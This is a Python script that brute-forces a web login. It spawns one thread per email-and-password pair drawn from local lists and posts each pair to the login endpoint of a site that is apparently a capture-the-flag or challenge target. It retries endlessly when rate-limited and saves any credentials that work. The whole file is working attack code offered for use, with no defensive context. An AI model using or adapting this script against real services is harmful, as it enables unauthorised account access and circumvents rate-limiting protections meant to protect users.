###### Config Here ########
fromEmailIndex = 0  # 0-9999
toEmailIndex = 2  # 0-9999
uid = 'eb60f7a5715370af8f22acf9b2beb127'


###### Code begins here ########
import requests
import threading
import re

with open('emails.txt') as f:
    emails = f.readlines()
# you may also want to remove whitespace characters like `\n` at the end of each line
emails = [x.strip() for x in emails]

with open('1mill-top100.txt') as f:
    passwords = f.readlines()
# you may also want to remove whitespace characters like `\n` at the end of each line
passwords = [x.strip() for x in passwords]


num = 0
def worker(email, password):
    """thread worker function"""
    global num
    r = do_request(email, password)
    print(email + r + " " + str(num))
    if "Invalid credentials" not in r:
        text_file = open("Output.txt", "w")
        text_file.write(email + " " + password)
        text_file.close()
        print("Found it!!!")
        exit(0)
    num += 1


def do_request(email, password):
    while True:
        try:
            r = requests.post('https://network.liber8tion.cityinthe.cloud/login?uid='+uid,
                              json={"email": email, "password": password}, timeout=5)
            match = re.match(".*Too Many Requests.*", r.text)
            if "Too Many Requests" in r.text or "Max retries exceeded" in r.text:
                continue
            return str(r.text)
        except requests.exceptions.ConnectTimeout as e:
            continue
        except requests.exceptions.Timeout as e:
            continue
        except:
            continue

threads = []
print("Running this shit for " + str(len(emails[fromEmailIndex:toEmailIndex])) + " emails...")
for email in emails[fromEmailIndex:toEmailIndex]:
    for password in passwords:
        t = threading.Thread(target=worker, args=(email,password))
        threads.append(t)
        t.start()
